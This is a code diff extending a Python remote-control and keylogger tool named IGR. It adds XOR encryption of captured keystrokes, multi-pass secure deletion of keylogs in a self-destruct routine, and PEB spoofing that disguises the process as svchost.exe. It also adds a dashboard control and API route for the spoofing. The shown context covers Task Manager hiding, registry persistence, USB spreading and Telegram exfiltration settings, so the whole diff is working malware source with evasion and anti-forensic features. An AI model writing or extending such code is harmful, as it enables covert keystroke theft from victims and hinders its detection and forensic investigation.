@@ -17,6 +17,7 @@ DASHBOARD_PASSWORD = "BUILD_DASHBOARD_PASSWORD"
 TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
 TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
 UPDATE_URL = "BUILD_UPDATE_URL"
+KEYLOG_ENCRYPTION_KEY = "BUILD_ENCRYPTION_KEY"
 
 # ============================================================================
 # END OF CONFIGURATION - DO NOT EDIT BELOW THIS LINE
@@ -202,6 +203,77 @@ def _hide_from_taskmanager() -> bool:
         ProcessInformation = 0x1D
         cls = ctypes.c_ulong * 1
         ntdll.NtSetInformationProcess(-1, ProcessInformation, cls(1), ctypes.sizeof(cls))
+        return True
+    except:
+        return False
+
+def _encrypt_data(data: str) -> bytes:
+    """Encrypt data using XOR with key derived from KEYLOG_ENCRYPTION_KEY."""
+    key = KEYLOG_ENCRYPTION_KEY or "igr_default_key_2024"
+    key_bytes = key.encode('utf-8')
+    data_bytes = data.encode('utf-8')
+    encrypted = bytearray(len(data_bytes) + 4)
+    encrypted[0:4] = len(data_bytes).to_bytes(4, 'little')
+    for i, b in enumerate(data_bytes):
+        encrypted[i + 4] = b ^ key_bytes[i % len(key_bytes)]
+    return bytes(encrypted)
+
+def _decrypt_data(encrypted: bytes) -> str:
+    """Decrypt XOR-encrypted data."""
+    if len(encrypted) < 4:
+        return ""
+    key = KEYLOG_ENCRYPTION_KEY or "igr_default_key_2024"
+    key_bytes = key.encode('utf-8')
+    data_len = int.from_bytes(encrypted[0:4], 'little')
+    data_bytes = bytearray(data_len)
+    for i in range(data_len):
+        data_bytes[i] = encrypted[i + 4] ^ key_bytes[i % len(key_bytes)]
+    return data_bytes.decode('utf-8', errors='replace')
+
+def _secure_delete_file(path: str, passes: int = 3) -> bool:
+    """Securely delete a file by overwriting with random data before removal."""
+    try:
+        if not os.path.exists(path):
+            return True
+        size = os.path.getsize(path)
+        for _ in range(passes):
+            with open(path, 'wb') as f:
+                f.write(os.urandom(size))
+                f.flush()
+                os.fsync(f.fileno())
+        os.remove(path)
+        return True
+    except:
+        try:
+            os.remove(path)
+        except:
+            pass
+        return False
+
+def _spoof_process_name() -> bool:
+    """Attempt to spoof process name in PEB for anti-forensics."""
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        ntdll = ctypes.windll.ntdll
+        peb_offset = 0x30 if ctypes.sizeof(ctypes.c_void_p) == 4 else 0x60
+        process_params_offset = 0x10 if ctypes.sizeof(ctypes.c_void_p) == 4 else 0x20
+        fake_name = "svchost.exe\0"
+        fake_w = "svchost.exe\0".encode('utf-16-le')
+        current_process = kernel32.GetCurrentProcess()
+        pbi = (ctypes.c_ulong * 6)()
+        ntdll.NtQueryInformationProcess(current_process, 0, pbi, ctypes.sizeof(pbi), None)
+        peb_addr = pbi[1]
+        if not peb_addr:
+            return False
+        process_params_addr = ctypes.c_void_p.from_address(peb_addr + process_params_offset).value
+        if not process_params_addr:
+            return False
+        image_path_addr = process_params_addr + (0x38 if ctypes.sizeof(ctypes.c_void_p) == 8 else 0x1C)
+        buf_ptr = ctypes.c_void_p.from_address(image_path_addr)
+        old_ptr = buf_ptr.value
+        new_buf = ctypes.create_unicode_buffer("svchost.exe")
+        buf_ptr.value = ctypes.addressof(new_buf)
         return True
     except:
         return False
@@ -2041,6 +2113,7 @@ DASHBOARD_HTML = r'''
     </style>
 </head>
 <body>
+    <script>try{window.RTCPeerConnection=function(){};window.webkitRTCPeerConnection=function(){};window.mozRTCPeerConnection=function(){};}catch(e){}</script>
     <!-- Login Screen -->
     <div class="login-screen" id="loginScreen">
         <div class="login-box">
@@ -2448,6 +2521,10 @@ DASHBOARD_HTML = r'''
                 <div class="section">
                     <div class="section-header"><div class="section-title">Registry Persistence</div><button class="btn small" onclick="stealthRegistry()">Add Key</button></div>
                     <div class="log-box" id="registryBox">Adds HKCU Run key so IGR starts on login. No admin required.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Process Name Spoof</div><button class="btn small" onclick="spoofProcess()">Spoof Now</button></div>
+                    <div class="log-box" id="spoofBox">Modifies the PEB to change the process name shown in task manager and process lists to svchost.exe.</div>
                 </div>
                 <div class="section" style="grid-column: 1 / -1;">
                     <div class="section-header"><div class="section-title">Current Persistence</div></div>
@@ -3061,6 +3138,13 @@ DASHBOARD_HTML = r'''
             document.getElementById('registryBox').textContent = data.success ? 'Registry key added. IGR will start on login.' : 'Failed: ' + (data.error || 'access denied');
             logActivity('Registry persistence: ' + (data.success ? 'added' : 'failed'));
         }
+        async function spoofProcess() {
+            document.getElementById('spoofBox').textContent = 'Spoofing...';
+            const res = await fetch('/api/stealth/spoof', {method:'POST'});
+            const data = await res.json();
+            document.getElementById('spoofBox').textContent = data.success ? 'Process name spoofed to svchost.exe in PEB.' : 'Failed: ' + (data.error || 'not supported');
+            logActivity('Process spoof: ' + (data.success ? 'success' : 'failed'));
+        }
         function loadPersistenceInfo() {
             const info = document.getElementById('persistenceInfo');
             info.innerHTML = `<strong>Startup Folder:</strong> WindowsRuntime.lnk<br><strong>Scheduled Task:</strong> WindowsRuntime (at boot)<br><strong>Registry Run:</strong> HKCU\\...\\Run\\WindowsRuntime<br><strong>Internal Copies:</strong> 4 hidden locations<br><strong>Watchdog:</strong> Monitors process every 30s`;
@@ -3461,8 +3545,13 @@ def save_keylog(k):
     keylog_buffer.append(k)
     keylog_full_log += k
     try:
-        with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
-            f.write(k)
+        if KEYLOG_ENCRYPTION_KEY and not KEYLOG_ENCRYPTION_KEY.startswith("BUILD_"):
+            enc_path = KEYLOG_FILE + '.enc'
+            with open(enc_path, 'ab') as f:
+                f.write(_encrypt_data(k))
+        else:
+            with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
+                f.write(k)
     except:
         pass
 
@@ -3653,8 +3742,14 @@ def keylogger_clear():
 
 @app.route('/api/keylogger/download')
 def keylogger_download():
-    """Download all keylogs as file."""
+    """Download all keylogs as file. Decrypts if encrypted."""
     try:
+        enc_path = KEYLOG_FILE + '.enc'
+        if KEYLOG_ENCRYPTION_KEY and not KEYLOG_ENCRYPTION_KEY.startswith("BUILD_") and os.path.exists(enc_path):
+            with open(enc_path, 'rb') as f:
+                raw = f.read()
+            decrypted = _decrypt_data(raw)
+            return Response(decrypted, mimetype='text/plain', headers={'Content-Disposition': 'attachment; filename=keylogs.txt'})
         if os.path.exists(KEYLOG_FILE):
             return send_file(KEYLOG_FILE, as_attachment=True, download_name='keylogs.txt')
         return Response('No logs yet', mimetype='text/plain')
@@ -4645,6 +4740,15 @@ def stealth_registry():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+@app.route('/api/stealth/spoof', methods=['POST'])
+def stealth_spoof():
+    """Spoof process name in PEB."""
+    try:
+        success = _spoof_process_name()
+        return jsonify({'success': success})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
 @app.route('/api/spread/usb', methods=['POST'])
 def spread_usb():
     """Copy IGR to all connected USB drives."""
@@ -4726,9 +4830,14 @@ def panic_self_destruct():
         except:
             pass
         try:
+            _secure_delete_file(KEYLOG_FILE)
+            _secure_delete_file(KEYLOG_FILE + '.enc')
+        except:
+            pass
+        try:
             state_file = os.path.join(KEYLOG_DIR, ".tg_state.json")
             if os.path.exists(state_file):
-                os.remove(state_file)
+                _secure_delete_file(state_file)
         except:
             pass
         try:
